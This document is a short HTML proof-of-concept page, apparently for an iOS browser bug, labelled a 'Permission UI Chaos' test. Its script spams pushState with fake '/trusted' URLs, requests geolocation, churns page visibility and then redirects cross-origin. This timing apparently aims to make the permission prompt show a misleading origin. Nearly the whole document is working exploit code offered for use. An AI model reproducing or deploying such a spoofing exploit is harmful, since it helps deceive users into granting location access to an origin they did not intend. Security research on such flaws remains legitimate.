<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>iOS Permission UI Chaos PoC</title>
<meta name="viewport" content="width=device-width,initial-scale=1">

<style>
body {
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#000;
  color:#0f0;
  text-align:center;
  margin:0;
}
button {
  margin-top:40px;
  padding:14px 20px;
  font-size:16px;
  border:none;
  border-radius:12px;
  background:#ff0033;
  color:#fff;
}
pre {
  margin:20px;
  font-size:11px;
  text-align:left;
  white-space:pre-wrap;
}
</style>
</head>

<body>

<h3>⚠️ Permission UI Chaos Test</h3>
<button id="go">START SATAN POC</button>
<pre id="log"></pre>

<script>
const log = m =>
  document.getElementById('log').textContent += m + "\n";

let started = false;

document.getElementById('go').onclick = () => {
  if (started) return;
  started = true;

  log("[*] pushState spam");
  for (let i=0;i<5;i++) {
    history.pushState({}, '', '/trusted'+i);
  }

  log("[*] request geolocation");
  navigator.geolocation.getCurrentPosition(
    ()=>log("[+] geo success"),
    ()=>log("[-] geo denied")
  );

  log("[*] lifecycle churn");
  document.body.style.display='none';
  setTimeout(()=>document.body.style.display='',10);

  log("[*] visibility churn");
  document.addEventListener('visibilitychange',()=>{});

  log("[*] navigation chaos armed");
};

window.addEventListener('pageshow', () => {
  if (!started) return;

  requestAnimationFrame(()=>{
    requestAnimationFrame(()=>{
      setTimeout(()=>{
        log("[!] cross-origin nav");
        location.href = "https://google.com:9090";
      }, 55);
    });
  });
});
</script>

</body>
</html>
